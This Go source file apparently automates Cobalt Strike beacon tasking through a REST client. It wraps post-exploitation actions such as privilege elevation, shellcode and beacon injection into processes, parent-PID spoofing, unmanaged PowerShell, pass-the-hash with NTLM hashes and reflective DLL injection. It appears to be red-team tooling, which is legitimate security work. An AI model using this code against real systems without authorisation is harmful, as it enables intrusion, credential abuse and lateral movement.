package workflow

import (
	"context"
	"fmt"

	csclient "github.com/xenov-x/csrest"
)

// --- Command Execution Variants ---

// executeRun executes a command without cmd.exe
func (e *Executor) executeRun(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	program, ok := action.Parameters["program"].(string)
	if !ok {
		return "", fmt.Errorf("program parameter required for run")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.Run(ctx, beaconID, program, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeRunAs executes a command as another user
func (e *Executor) executeRunAs(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	user, ok := action.Parameters["user"].(string)
	if !ok {
		return "", fmt.Errorf("user parameter required for runas")
	}
	password, ok := action.Parameters["password"].(string)
	if !ok {
		return "", fmt.Errorf("password parameter required for runas")
	}
	command, ok := action.Parameters["command"].(string)
	if !ok {
		return "", fmt.Errorf("command parameter required for runas")
	}
	domain, _ := action.Parameters["domain"].(string) // optional
	args, _ := action.Parameters["args"].(string)     // optional

	resp, err := client.RunAs(ctx, beaconID, domain, user, password, command, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeRunUnder executes a command with specified PID as parent
func (e *Executor) executeRunUnder(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for run_under")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	command, ok := action.Parameters["command"].(string)
	if !ok {
		return "", fmt.Errorf("command parameter required for run_under")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.RunUnder(ctx, beaconID, pid, command, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeRunNoOutput executes a command without blocking or returning output
func (e *Executor) executeRunNoOutput(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	cmd, ok := action.Parameters["command"].(string)
	if !ok {
		return "", fmt.Errorf("command parameter required for run_no_output")
	}

	resp, err := client.RunNoOutput(ctx, beaconID, cmd)
	if err != nil {
		return "", err
	}
	return e.fireAndForget(resp.TaskID, "execute (no output): "+cmd)
}

// --- Privilege Elevation ---

// executeElevateCommand executes a command in elevated context
func (e *Executor) executeElevateCommand(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	exploit, ok := action.Parameters["exploit"].(string)
	if !ok {
		return "", fmt.Errorf("exploit parameter required for elevate_command")
	}
	command, ok := action.Parameters["command"].(string)
	if !ok {
		return "", fmt.Errorf("command parameter required for elevate_command")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.ElevateCommand(ctx, beaconID, exploit, command, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeElevateBeacon creates an elevated beacon session
func (e *Executor) executeElevateBeacon(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	exploit, ok := action.Parameters["exploit"].(string)
	if !ok {
		return "", fmt.Errorf("exploit parameter required for elevate_beacon")
	}
	listener, ok := action.Parameters["listener"].(string)
	if !ok {
		return "", fmt.Errorf("listener parameter required for elevate_beacon")
	}

	resp, err := client.ElevateBeacon(ctx, beaconID, exploit, listener)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- Beacon/Shellcode Spawn & Inject ---

// executeSpawnBeacon spawns a beacon process
func (e *Executor) executeSpawnBeacon(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	listener, ok := action.Parameters["listener"].(string)
	if !ok {
		return "", fmt.Errorf("listener parameter required for spawn_beacon")
	}
	arch, _ := action.Parameters["arch"].(string) // optional (x86 or x64)

	resp, err := client.SpawnBeacon(ctx, beaconID, listener, arch)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeSpawnBeaconAsUser spawns a beacon process as another user
func (e *Executor) executeSpawnBeaconAsUser(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	password, ok := action.Parameters["password"].(string)
	if !ok {
		return "", fmt.Errorf("password parameter required for spawn_beacon_as_user")
	}
	listener, ok := action.Parameters["listener"].(string)
	if !ok {
		return "", fmt.Errorf("listener parameter required for spawn_beacon_as_user")
	}
	domain, _ := action.Parameters["domain"].(string) // optional
	user, _ := action.Parameters["user"].(string)     // optional

	resp, err := client.SpawnBeaconAsUser(ctx, beaconID, domain, user, password, listener)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeSpawnBeaconUnder spawns a beacon with specified PID as parent
func (e *Executor) executeSpawnBeaconUnder(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for spawn_beacon_under")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	listener, ok := action.Parameters["listener"].(string)
	if !ok {
		return "", fmt.Errorf("listener parameter required for spawn_beacon_under")
	}

	resp, err := client.SpawnBeaconUnder(ctx, beaconID, pid, listener)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeInjectBeacon injects beacon shellcode into a process
func (e *Executor) executeInjectBeacon(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for inject_beacon")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	listener, ok := action.Parameters["listener"].(string)
	if !ok {
		return "", fmt.Errorf("listener parameter required for inject_beacon")
	}
	arch, _ := action.Parameters["arch"].(string) // optional (x86 or x64)

	resp, err := client.InjectBeacon(ctx, beaconID, pid, arch, listener)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeSpawnShellcode spawns a process and injects shellcode
func (e *Executor) executeSpawnShellcode(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	arch, ok := action.Parameters["arch"].(string)
	if !ok {
		return "", fmt.Errorf("arch parameter required for spawn_shellcode")
	}
	shellcodePath, ok := action.Parameters["shellcode"].(string)
	if !ok {
		return "", fmt.Errorf("shellcode parameter required for spawn_shellcode")
	}

	resp, err := client.SpawnShellcode(ctx, beaconID, arch, shellcodePath)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeInjectShellcode injects shellcode into a process
func (e *Executor) executeInjectShellcode(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for inject_shellcode")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	arch, ok := action.Parameters["arch"].(string)
	if !ok {
		return "", fmt.Errorf("arch parameter required for inject_shellcode")
	}
	shellcodePath, ok := action.Parameters["shellcode"].(string)
	if !ok {
		return "", fmt.Errorf("shellcode parameter required for inject_shellcode")
	}

	resp, err := client.InjectShellcode(ctx, beaconID, pid, arch, shellcodePath)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- PowerShell & .NET ---

// executePowerShellImport imports a PowerShell script
func (e *Executor) executePowerShellImport(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	scriptPath, ok := action.Parameters["script"].(string)
	if !ok {
		return "", fmt.Errorf("script parameter required for powershell_import")
	}

	resp, err := client.PowerShellImport(ctx, beaconID, scriptPath)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executePowerPick executes unmanaged PowerShell (spawn)
func (e *Executor) executePowerPick(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	commandlet, ok := action.Parameters["commandlet"].(string)
	if !ok {
		return "", fmt.Errorf("commandlet parameter required for powerpick")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.PowerPick(ctx, beaconID, commandlet, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executePsInject executes unmanaged PowerShell (inject)
func (e *Executor) executePsInject(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for psinject")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	arch, ok := action.Parameters["arch"].(string)
	if !ok {
		return "", fmt.Errorf("arch parameter required for psinject")
	}
	commandlet, ok := action.Parameters["commandlet"].(string)
	if !ok {
		return "", fmt.Errorf("commandlet parameter required for psinject")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.PsInject(ctx, beaconID, pid, arch, commandlet, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeExecuteAssembly executes a .NET assembly
func (e *Executor) executeExecuteAssembly(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	assemblyPath, ok := action.Parameters["assembly"].(string)
	if !ok {
		return "", fmt.Errorf("assembly parameter required for execute_assembly")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.ExecuteAssembly(ctx, beaconID, assemblyPath, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- Pass-the-Hash ---

// executeSpawnPth spawns a process for pass-the-hash
func (e *Executor) executeSpawnPth(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	user, ok := action.Parameters["user"].(string)
	if !ok {
		return "", fmt.Errorf("user parameter required for spawn_pth")
	}
	ntlmHash, ok := action.Parameters["ntlm_hash"].(string)
	if !ok {
		return "", fmt.Errorf("ntlm_hash parameter required for spawn_pth")
	}
	domain, _ := action.Parameters["domain"].(string) // optional

	resp, err := client.SpawnPth(ctx, beaconID, domain, user, ntlmHash)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeInjectPth injects into a process for pass-the-hash
func (e *Executor) executeInjectPth(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for inject_pth")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	user, ok := action.Parameters["user"].(string)
	if !ok {
		return "", fmt.Errorf("user parameter required for inject_pth")
	}
	ntlmHash, ok := action.Parameters["ntlm_hash"].(string)
	if !ok {
		return "", fmt.Errorf("ntlm_hash parameter required for inject_pth")
	}
	arch, _ := action.Parameters["arch"].(string)   // optional
	domain, _ := action.Parameters["domain"].(string) // optional

	resp, err := client.InjectPth(ctx, beaconID, pid, arch, domain, user, ntlmHash)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- DLL Operations ---

// executeInjectDll injects a reflective DLL into a process
func (e *Executor) executeInjectDll(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for inject_dll")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	dllPath, ok := action.Parameters["dll"].(string)
	if !ok {
		return "", fmt.Errorf("dll parameter required for inject_dll")
	}

	resp, err := client.InjectDll(ctx, beaconID, pid, dllPath)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeInjectLoadDll loads a DLL from disk via LoadLibrary
func (e *Executor) executeInjectLoadDll(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for inject_load_dll")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	path, ok := action.Parameters["path"].(string)
	if !ok {
		return "", fmt.Errorf("path parameter required for inject_load_dll")
	}

	resp, err := client.InjectLoadDll(ctx, beaconID, pid, path)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- PostEx DLL ---

// executeSpawnPostExDll spawns a temporary process and injects postex DLL
func (e *Executor) executeSpawnPostExDll(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	dllPath, ok := action.Parameters["dll"].(string)
	if !ok {
		return "", fmt.Errorf("dll parameter required for spawn_postex_dll")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.SpawnPostExDll(ctx, beaconID, dllPath, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeInjectPostExDll injects postex DLL into a process
func (e *Executor) executeInjectPostExDll(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for inject_postex_dll")
	}
	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid must be a number")
	}

	dllPath, ok := action.Parameters["dll"].(string)
	if !ok {
		return "", fmt.Errorf("dll parameter required for inject_postex_dll")
	}
	args, _ := action.Parameters["args"].(string) // optional

	resp, err := client.InjectPostExDll(ctx, beaconID, pid, dllPath, args)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// --- Registry ---

// executeRegQuery queries a registry key
func (e *Executor) executeRegQuery(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	arch, ok := action.Parameters["arch"].(string)
	if !ok {
		return "", fmt.Errorf("arch parameter required for reg_query")
	}
	path, ok := action.Parameters["path"].(string)
	if !ok {
		return "", fmt.Errorf("path parameter required for reg_query")
	}

	resp, err := client.RegQuery(ctx, beaconID, arch, path)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeRegQueryValue queries a registry subkey value
func (e *Executor) executeRegQueryValue(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	arch, ok := action.Parameters["arch"].(string)
	if !ok {
		return "", fmt.Errorf("arch parameter required for reg_queryv")
	}
	path, ok := action.Parameters["path"].(string)
	if !ok {
		return "", fmt.Errorf("path parameter required for reg_queryv")
	}
	subkey, ok := action.Parameters["subkey"].(string)
	if !ok {
		return "", fmt.Errorf("subkey parameter required for reg_queryv")
	}

	resp, err := client.RegQueryValue(ctx, beaconID, arch, path, subkey)
	if err != nil {
		return "", err
	}
	return e.waitForOutput(ctx, client, resp.TaskID)
}
